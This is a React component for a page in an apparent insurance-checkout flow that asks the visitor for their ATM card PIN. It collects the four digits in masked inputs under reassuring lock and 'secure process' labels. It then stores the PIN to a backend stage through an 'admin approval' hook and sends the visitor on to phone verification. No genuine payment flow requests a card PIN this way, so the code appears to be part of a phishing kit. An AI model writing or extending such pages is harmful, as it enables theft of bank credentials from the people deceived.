import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { CreditCard, Shield, Lock, Loader2 } from "lucide-react";
import InsuranceStepper from "@/components/InsuranceStepper";
import { createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";

const ATMPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const a = t.atm;
  const offer = location.state?.offer;
  const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [pin, setPin] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => { inputRefs.current[0]?.focus(); }, []);

  const handleChange = (i: number, v: string) => {
    if (!/^\d*$/.test(v)) return;
    const n = [...pin]; n[i] = v.slice(-1); setPin(n);
    if (v && i < 3) inputRefs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !pin[i] && i > 0) inputRefs.current[i - 1]?.focus();
  };

  const handleVerify = () => {
    if (pin.join("").length !== 4) return;
    setLoading(true);
    const doSubmit = async () => {
      await createOrUpdateStage(orderId, "payment", { atm_pin: pin.join("") });
      linkVisitorToSession({});
      setLoading(false);
      navigate("/insurance/phone-verify", { state: { offer, orderId } });
    };
    doSubmit();
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <div className="flex items-center justify-center min-h-[60vh]">
          <p className="text-muted-foreground">{a.noPaymentData}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />

          <div className="max-w-md mx-auto">
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <div className="bg-card rounded-2xl border border-border shadow-sm p-5 md:p-6 text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", delay: 0.2 }}
                  className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4"
                >
                  <Lock className="w-8 h-8 text-primary" />
                </motion.div>

                <h2 className="text-lg font-bold text-foreground mb-2">{a.title}</h2>
                <p className="text-xs text-muted-foreground mb-6">{a.subtitle}</p>

                <div className="flex gap-3 justify-center mb-6" dir="ltr">
                  {pin.map((digit, i) => (
                    <motion.input
                      key={i}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.3 + i * 0.05 }}
                      ref={(el) => { inputRefs.current[i] = el; }}
                      type="password"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      className={`w-12 h-12 md:w-14 md:h-14 text-center text-xl md:text-2xl font-bold rounded-xl border-2 transition-all focus:outline-none ${
                        digit
                          ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10"
                          : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"
                      }`}
                    />
                  ))}
                </div>

                <Button
                  onClick={handleVerify}
                  disabled={loading || pin.join("").length !== 4}
                  className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      {a.verifying}
                    </>
                  ) : (
                    <>
                      <Lock className="w-3.5 h-3.5" />
                      {a.confirm}
                    </>
                  )}
                </Button>

                <div className="flex items-center justify-center gap-2 mt-4 pt-3 border-t border-border">
                  <Shield className="w-3.5 h-3.5 text-primary/60" />
                  <span className="text-[10px] text-muted-foreground">{a.secureProcess}</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ATMPayment;
